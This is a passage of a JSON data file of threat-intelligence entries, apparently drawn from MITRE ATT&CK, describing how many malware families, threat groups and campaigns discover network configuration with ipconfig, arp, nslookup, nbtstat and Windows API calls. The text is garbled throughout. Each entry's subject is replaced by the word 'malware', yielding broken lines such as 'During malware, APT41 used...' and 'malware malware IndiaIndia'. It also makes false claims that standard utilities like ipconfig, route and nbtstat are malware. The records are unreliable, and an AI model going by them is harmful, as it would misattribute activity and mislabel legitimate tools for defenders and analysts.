                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used code to obtain the external public-facing IPv4 address of the compromised host.[44]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 used cmd.exe /c ping %userdomain% for discovery.[45]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors ran nslookup and Advanced IP Scanner on the target network.[46]"
            },
            "S0274": {
                "ID": "S0274",
                "Name": "Calisto",
                "Description": "malware runs the ifconfig command to obtain the IP address from the victim\u2019s machine.[47]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware can collect the IP address of the victims and other computers on the network using the commands: ipconfig -all nbtstat -n, and nbtstat -s.[48][49]"
            },
            "S0261": {
                "ID": "S0261",
                "Name": "Catchamas",
                "Description": "malware gathers the Mac address, IP address, and the network adapter information from the victim\u2019s machine.[50]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware can gather the IP address from the victim's machine using the IP config command.[51]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware has the ability to use ipconfig to enumerate system network settings.[52]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used ipconfig, Ping, and tracert to enumerate the IP address and network environment and settings of the local host.[53]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can enumerate the IP address of a compromised host.[54]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can enumerate the IP address of a compromised machine.[55][56]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can determine the NetBios name and  the IP addresses of targets machines including domain controllers.[57][58]"
            },
            "S0244": {
                "ID": "S0244",
                "Name": "Comnie",
                "Description": "malware uses ipconfig /all and route PRINT to identify network adapter and interface information.[59]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can retrieve the ARP cache from the local system by using the GetIpNetTable() API call and check to ensure IP addresses it connects to are for local, non-Internet, systems.[60]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can collect DNS information from the targeted system.[61]"
            },
            "S1024": {
                "ID": "S1024",
                "Name": "CreepySnail",
                "Description": "malware can use getmac and Get-NetIPAddress to enumerate network settings.[62]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware contains a command to collect the victim MAC address and LAN IP.[63][64]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware can retrieve the ARP cache from the local system by using GetIpNetTable.[65]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware can use the Linux API if_nameindex to gather network interface names.[66][67]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware has collected the IP address and network adapter information from the victim\u2019s machine.[68][69]"
            },
            "S1052": {
                "ID": "S1052",
                "Name": "DEADEYE",
                "Description": "malware can discover the DNS domain name of a targeted system.[45]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware uses ipconfig to gather the IP address from the system.[18]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware can enumerate victims' local and external IPs when registering with C2.[70]"
            },
            "S0472": {
                "ID": "S0472",
                "Name": "down_new",
                "Description": "malware has the ability to identify the MAC address of a compromised host.[25]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has used batch scripts to enumerate network information, including information about trusts, zones, and the domain.[71]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware can collect the host's IP addresses using the ipconfig command.[72][73]"
            },
            "S0038": {
                "ID": "S0038",
                "Name": "Duqu",
                "Description": "The reconnaissance modules used with malware can collect information on network configuration.[74]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware has the ability to identify network settings on a compromised host.[75]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware used the command ipconfig to obtain information about network configurations.[76]"
            },
            "S0605": {
                "ID": "S0605",
                "Name": "EKANS",
                "Description": "malware can determine the domain of a compromised host.[77]"
            },
            "S0081": {
                "ID": "S0081",
                "Name": "Elise",
                "Description": "malware executes ipconfig /all after initial communication is made to the remote server.[78][79]"
            },
            "S0082": {
                "ID": "S0082",
                "Name": "Emissary",
                "Description": "malware has the capability to execute the command ipconfig /all.[80]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can acquire network configuration information like DNS servers, public IP, and network proxies used by a host.[81][82]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware uses the nbtstat -n and nbtstat -s commands on the victim\u2019s machine.[83]"
            },
            "S0569": {
                "ID": "S0569",
                "Name": "Explosive",
                "Description": "malware has collected the MAC address from the victim's machine.[84]"
            },
            "S0181": {
                "ID": "S0181",
                "Name": "FALLCHILL",
                "Description": "malware collects MAC address and local IP address information from the victim.[85]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can identify the MAC address on the target computer.[86]"
            },
            "S0171": {
                "ID": "S0171",
                "Name": "Felismus",
                "Description": "malware collects the victim LAN IP address and sends it to the C2 server.[87]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware collects information about the network including the IP address and DHCP server.[88]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has used nslookup and ipconfig for network reconnaissance efforts. malware has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information.[89][90]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has been used to execute the ipconfig /all command on a victim system.[91]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors used Empire to find the public IP address of a compromised system.[82]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can parse the ProxyServer string in the Registry to discover http proxies.[92]"
            },
            "C0007": {
                "ID": "C0007",
                "Name": "FunnyDream",
                "Description": "During malware, the threat actors used ipconfig for discovery on remote systems.[92]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers.[93]"
            },
            "S0049": {
                "ID": "S0049",
                "Name": "GeminiDuke",
                "Description": "malware collects information on network settings and Internet proxy settings from the victim.[94]"
            },
            "S0588": {
                "ID": "S0588",
                "Name": "GoldMax",
                "Description": "malware retrieved a list of the system's network interface after execution.[95]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can determine the IP and physical location of the compromised host via IPinfo.[96]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware collects the victim IP address, MAC address, as well as the victim account domain name.[97]"
            },
            "S0690": {
                "ID": "S0690",
                "Name": "Green Lambert",
                "Description": "malware can obtain proxy information from a victim's machine using system environment variables.[98][99]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware can enumerate the IP and domain of a target system.[100]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has collected IP information via IPInfo.[101]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has used Ping and tracert for network discovery.[102]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware used ipconfig to gather network configuration information.[103][104]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to identify the IP address of the compromised machine.[105]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.[106][107]"
            },
            "S1022": {
                "ID": "S1022",
                "Name": "IceApple",
                "Description": "The malware ifconfig module can iterate over all network interfaces on the host and retrieve the name, description, MAC address, DNS suffix, DNS servers, gateways, IPv4 addresses, and subnet masks.[108]"
            },
            "S0101": {
                "ID": "S0101",
                "Name": "ifconfig",
                "Description": "malware can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP."
            },
            "S0278": {
                "ID": "S0278",
                "Name": "iKitten",
                "Description": "malware will look for the current IP address.[109]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware\u2019s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.[110]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.[111][112]"
            },
            "S0100": {
                "ID": "S0100",
                "Name": "ipconfig",
                "Description": "malware can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP."
            },
            "S0015": {
                "ID": "S0015",
                "Name": "Ixeshe",
                "Description": "malware enumerates the IP address, network proxy settings, and domain name from a victim's system.[113]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "A malware variant gathers network interface card information.[114]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can obtain network information, including DNS, IP, and proxies.[115]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can gather victim internal and external IPs.[116]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware gathers information about network adapters.[117]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has performed local network configuration discovery using ipconfig.[118][119][120]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware has collected the DNS address of the infected host.[41]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can collect the MAC address and other information from a victim machine using ipconfig/all.[102]"
            },
            "S0387": {
                "ID": "S0387",
                "Name": "KeyBoy",
                "Description": "malware can determine the public or WAN IP address for the system.[121]"
            },
            "S0271": {
                "ID": "S0271",
                "Name": "KEYMARBLE",
                "Description": "malware gathers the MAC address of the victim\u2019s machine.[122]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used ipconfig/all to gather network configuration information.[123]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can retrieve the contents of the IP routing table as well as information about the Windows domain.[124][125]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware can record the IP address of the target machine.[126]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware can collect the IP address from the victim\u2019s machine.[127]"
            },
            "S1075": {
                "ID": "S1075",
                "Name": "KOPILUWAK",
                "Description": "malware can use Arp to discover a target's network configuration setttings.[128]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print. It also collects the system's MAC address with getmac and domain configuration with net config workstation.[129]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware malware IndiaIndia obtains and sends to its C2 server information about the first network interface card\u2019s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.[130][131]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware gathers information about network adapters using the Win32 API call GetAdaptersInfo.[132]"
            },
            "S0513": {
                "ID": "S0513",
                "Name": "LiteDuke",
                "Description": "malware has the ability to discover the proxy configuration of Firefox and/or Opera.[86]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can retrieve network information from a compromised host.[133]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has the ability to discover the domain name of the infected host.[134]"
            },
            "S0451": {
                "ID": "S0451",
                "Name": "LoudMiner",
                "Description": "malware used a script to gather the IP address of the infected machine before sending to the C2.[135]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can collect the IP address of a compromised host.[136]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware collects the MAC address of the target computer and other network configuration information.[137][138]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware can collect IP addresses from a compromised host.[139]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can use the GetAdaptersInfo function to retrieve information about network adapters and the GetIpNetTable function to retrieve the IPv4 to physical network address mapping table.[140]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware malware gathers the victim's local IP address, MAC address, and external IP address.[141][142][143]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.[144]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware can run C:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1 to discover network settings.[145]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware may create a file containing the results of the command cmd.exe /c ipconfig /all.[146]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware obtains the victim IP address.[147]"
            },
            "S0284": {
                "ID": "S0284",
                "Name": "More_eggs",
                "Description": "malware has the capability to gather the IP address from the victim's machine.[148]"
            },
            "G1009": {
                "ID": "G1009",
                "Name": "Moses Staff",
                "Description": "malware has collected the domain name of a compromised network.[149]"
            },
            "S0256": {
                "ID": "S0256",
                "Name": "Mosquito",
                "Description": "malware uses the ipconfig command.[150]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used malware to collect the victim\u2019s IP address and domain name.[151]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has used ipconfig and arp to determine network configuration information.[152]"
            },
            "S0205": {
                "ID": "S0205",
                "Name": "Naid",
                "Description": "malware collects the domain name from a compromised host.[153]"
            },
            "G0019": {
                "ID": "G0019",
                "Name": "Naikon",
                "Description": "malware uses commands such as netsh interface show to discover network interface settings.[154]"
            },
            "S0228": {
                "ID": "S0228",
                "Name": "NanHaiShu",
                "Description": "malware can gather information about the victim proxy server.[155]"
            },
            "S0336": {
                "ID": "S0336",
                "Name": "NanoCore",
                "Description": "malware gathers the IP address from the victim\u2019s machine.[156]"
            },
            "S0590": {
                "ID": "S0590",
                "Name": "NBTscan",
                "Description": "malware can be used to collect MAC addresses.[157][158]"
            },
            "S0102": {
                "ID": "S0102",
                "Name": "nbtstat",
                "Description": "malware can be used to discover local NetBIOS domain names."
            },
            "S0691": {
                "ID": "S0691",
                "Name": "Neoichor",
                "Description": "malware can gather the IP address from an infected host.[120]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can collect the IP address of a compromised host.[159][160]"
            },
            "S1106": {
                "ID": "S1106",
                "Name": "NGLite",
                "Description": "malware identifies the victim system MAC and IPv4 addresses and uses these to establish a victim identifier.[161]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware can enumerate the IP address on compromised systems.[162]"
            },
            "S0359": {
                "ID": "S0359",
                "Name": "Nltest",
                "Description": "malware may be used to enumerate the parent domain of a local machine using /parentdomain.[163]"
            },
            "S0353": {
                "ID": "S0353",
                "Name": "NOKKI",
                "Description": "malware can gather information on the victim IP address.[164]"
            },
            "S0346": {
                "ID": "S0346",
                "Name": "OceanSalt",
                "Description": "malware can collect the victim\u2019s IP address.[165]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware can collect the host IP address from the victim\u2019s machine.[166]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has run ipconfig /all on a victim.[167][168]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "malware can collect network information, including the host IP address, DNS, and proxy information.[169]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware uses API calls to enumerate the infected system's ARP table.[170]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors used ipconfig, nbtstat, tracert, route print, and cat /etc/hosts commands.[171]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors discovered the local network configuration with ipconfig.[172]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "malware can gather victim proxy information.[155]"
            },
            "S0165": {
                "ID": "S0165",
                "Name": "OSInfo",
                "Description": "malware discovers the current domain information.[16]"
            },
            "S0352": {
                "ID": "S0352",
                "Name": "OSX_OCEANLOTUS.D",
                "Description": "malware can collect the network interface MAC address on the infected host.[173][174]"
            },
            "S0556": {
                "ID": "S0556",
                "Name": "Pay2Key",
                "Description": "malware can identify the IP and MAC addresses of the compromised host.[175]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware can obtain the proxy settings of a compromised machine using InternetQueryOptionA and its IP address by running nslookup myip.opendns.comresolver1.opendns.com\\r\\n.[92]"
            },
            "S0587": {
                "ID": "S0587",
                "Name": "Penquin",
                "Description": "malware can report the IP of the compromised host to attacker controlled infrastructure.[176]"
            },
            "S1031": {
                "ID": "S1031",
                "Name": "PingPull",
                "Description": "malware can retrieve the IP address of a compromised host.[177]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware can collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon.[178]"
            },
            "S0124": {
                "ID": "S0124",
                "Name": "Pisloader",
                "Description": "malware has a command to collect the victim's IP address.[179]"
            },
            "S0254": {
                "ID": "S0254",
                "Name": "PLAINTEE",
                "Description": "malware uses the ipconfig /all command to gather the victim\u2019s IP address.[180]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware can enumerate network adapter information.[181]"
            },
            "S0139": {
                "ID": "S0139",
                "Name": "PowerDuke",
                "Description": "malware has a command to get the victim's domain and NetBIOS name.[182]"
            },
            "S0441": {
                "ID": "S0441",
                "Name": "PowerShower",
                "Description": "malware has the ability to identify the current Windows domain of the infected host.[183]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware can retrieve IP, network adapter configuration information, and domain from compromised hosts.[184][185]"
            },
            "S0184": {
                "ID": "S0184",
                "Name": "POWRUNER",
                "Description": "malware may collect network configuration data by running ipconfig /all on a victim.[186]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "A module in malware collects information from the victim about its IP addresses and MAC addresses.[187]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware collects the network adapter information and domain/username information based on current remote sessions.[188]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware has built in commands to identify a host\u2019s IP address and find out other network configuration settings by viewing connected sessions.[189]"
            },
            "S0583": {
                "ID": "S0583",
                "Name": "Pysa",
                "Description": "malware can perform network reconnaissance using the Advanced IP Scanner tool.[190]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can use net config workstation, arp -a, nslookup, and ipconfig /all to gather network configuration information.[191][192][193][194][195]"
            },
            "S0269": {
                "ID": "S0269",
                "Name": "QUADAGENT",
                "Description": "malware gathers the current domain the victim system belongs to.[196]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0.[197]"
            },
            "S1076": {
                "ID": "S1076",
                "Name": "QUIETCANARY",
                "Description": "malware can identify the default proxy setting on a compromised host.[128]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can use ipconfig and Arp to collect network configuration information, including routing information and ARP tables.[198]"
            },
            "S0241": {
                "ID": "S0241",
                "Name": "RATANKBA",
                "Description": "malware gathers the victim\u2019s IP address via the ipconfig -all command.[199][200]"
            },
            "S0172": {
                "ID": "S0172",
                "Name": "Reaver",
                "Description": "malware collects the victim's IP address.[201]"
            },
            "S0153": {
                "ID": "S0153",
                "Name": "RedLeaves",
                "Description": "malware can obtain information about network parameters.[144]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.[202]"
            },
            "S0379": {
                "ID": "S0379",
                "Name": "Revenge RAT",
                "Description": "malware collects the IP address and MAC address from the system.[203]"
            },
            "S0433": {
                "ID": "S0433",
                "Name": "Rifdoor",
                "Description": "malware has the ability to identify the IP address of the compromised host.[204]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware can detect network adapter and IP address information.[205]"
            },
            "S0270": {
                "ID": "S0270",
                "Name": "RogueRobin",
                "Description": "malware gathers the IP address and domain from the victim\u2019s machine.[206]"
            },
            "S0103": {
                "ID": "S0103",
                "Name": "route",
                "Description": "malware can be used to discover routing configuration information."
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware can enumerate IP addresses using GetIpAddrTable.[207]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.[208][209]"
            },
            "S0085": {
                "ID": "S0085",
                "Name": "S-Type",
                "Description": "malware has used ipconfig /all on a compromised host.[146]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware can collect the IP address of a victim machine.[210]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to execute the ipconfig command.[211]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to determine the domain name and whether a proxy is configured on a compromised host.[212]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has collected the domain name of the victim system.[213]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware obtains the target's IP address and local network segment.[214][215]"
            },
            "S0450": {
                "ID": "S0450",
                "Name": "SHARPSTATS",
                "Description": "malware has the ability to identify the domain of the compromised host.[185]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.[216]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware checked if the compromised system is configured to use proxies.[95]"
            },
            "G1008": {
                "ID": "G1008",
                "Name": "SideCopy",
                "Description": "malware has identified the IP address of a compromised host.[3]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware has the ability to collect the domain name on a compromised host.[217]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used malware to collect information on network interfaces, including the MAC address.[218]"
            },
            "S0633": {
                "ID": "S0633",
                "Name": "Sliver",
                "Description": "malware has the ability to gather network configuration information.[219]"
            },
            "S1035": {
                "ID": "S1035",
                "Name": "Small Sieve",
                "Description": "malware can obtain the IP address of a victim host.[220]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware has the ability to enumerate the domain name of a victim, as well as if the host is a member of an Active Directory domain.[221][222][223]"
            },
            "S0516": {
                "ID": "S0516",
                "Name": "SoreFang",
                "Description": "malware can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via ipconfig.exe /all.[224]"
            },
            "S0374": {
                "ID": "S0374",
                "Name": "SpeakUp",
                "Description": "malware uses the ifconfig -a command. [225]"
            },
            "S0646": {
                "ID": "S0646",
                "Name": "SpicyOmelette",
                "Description": "malware can identify the IP of a compromised system.[226]"
            },
            "S1030": {
                "ID": "S1030",
                "Name": "Squirrelwaffle",
                "Description": "malware has collected the victim\u2019s external IP address.[227]"
            },
            "S1037": {
                "ID": "S1037",
                "Name": "STARWHALE",
                "Description": "malware has the ability to collect the IP address of an infected host.[228]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware gathers the Address Resolution Protocol (ARP) table from the victim.[229]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware can identify the IP address of a compromised host.[230]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware collects the IP address of a compromised system.[231]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information.[232]"
            },
            "S0018": {
                "ID": "S0018",
                "Name": "Sykipot",
                "Description": "malware may use ipconfig /all to gather system network configuration details.[233]"
            },
            "S0060": {
                "ID": "S0060",
                "Name": "Sys10",
                "Description": "malware collects the local IP address of the victim and sends it to the C2.[154]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can collected the IP address and domain name of a compromised host.[234]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware gathers and beacons the MAC and IP addresses during installation.[235]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware has collected the MAC address of a compromised host; it can also use GetAdaptersInfo to identify network adapters.[236][237]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to identify the MAC address on an infected host.[238]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has enumerated the host machine\u2019s IP address.[239]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware actors use NBTscan to discover vulnerable systems.[240]"
            },
            "S0678": {
                "ID": "S0678",
                "Name": "Torisma",
                "Description": "malware can collect the local MAC address using GetAdaptersInfo as well as the system's IP address.[241]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware obtains the IP address, location, and other relevant network information from the victim\u2019s machine.[242][243][57]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can gather information on the network configuration of a compromised host.[244]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has used scripts to collect the host's network topology.[245]"
            },
            "S0436": {
                "ID": "S0436",
                "Name": "TSCookie",
                "Description": "malware has the ability to identify the IP of the infected host.[246]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware can retrieve the internal IP address of a compromised host.[247]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, net config, ipconfig /all, and route commands, as well as NBTscan.[83][248][249] malware RPC backdoors have also retrieved registered RPC interface information from process memory.[250]"
            },
            "S0130": {
                "ID": "S0130",
                "Name": "Unknown Logger",
                "Description": "malware can obtain information about the victim's IP address.[251]"
            },
            "S0275": {
                "ID": "S0275",
                "Name": "UPPERCUT",
                "Description": "malware has the capability to gather the victim's proxy information.[252]"
            },
            "S0452": {
                "ID": "S0452",
                "Name": "USBferry",
                "Description": "malware can detect the infected machine's network topology using ipconfig and arp.[245]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware has the ability to identify the domain and the MAC and IP addresses of an infected machine.[253]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware gathers the local IP address.[254]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware can gather the IP address from the victim's machine.[255]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has executed multiple commands to enumerate network topology and settings including  ipconfig, netsh interface firewall show all, and netsh interface portproxy show all.[256]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware will attempt to determine the local network segment it is a part of.[257]"
            },
            "S0515": {
                "ID": "S0515",
                "Name": "WellMail",
                "Description": "malware can identify the IP address of the victim system.[258]"
            },
            "S0514": {
                "ID": "S0514",
                "Name": "WellMess",
                "Description": "malware can identify the IP address and user domain on the target machine.[259][260]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used ipconfig to identify the network configuration of a victim machine. malware has also used the PowerShell cmdlet Get-ADComputer to collect IP address data from Active Directory.[261][262]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can retrieve network interface and proxy information.[263]"
            },
            "S0341": {
                "ID": "S0341",
                "Name": "Xbash",
                "Description": "malware can collect IP addresses and local intranet information from a victim\u2019s machine.[264]"
            },
            "S0653": {
                "ID": "S0653",
                "Name": "xCaon",
                "Description": "malware has used the GetAdaptersInfo() API call to get the victim's MAC address.[42]"
            },
            "S0248": {
                "ID": "S0248",
                "Name": "yty",
                "Description": "malware runs ipconfig /all and collects the domain name.[265]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware runs the ipconfig /all command.[266]"
            },
            "S0230": {
                "ID": "S0230",
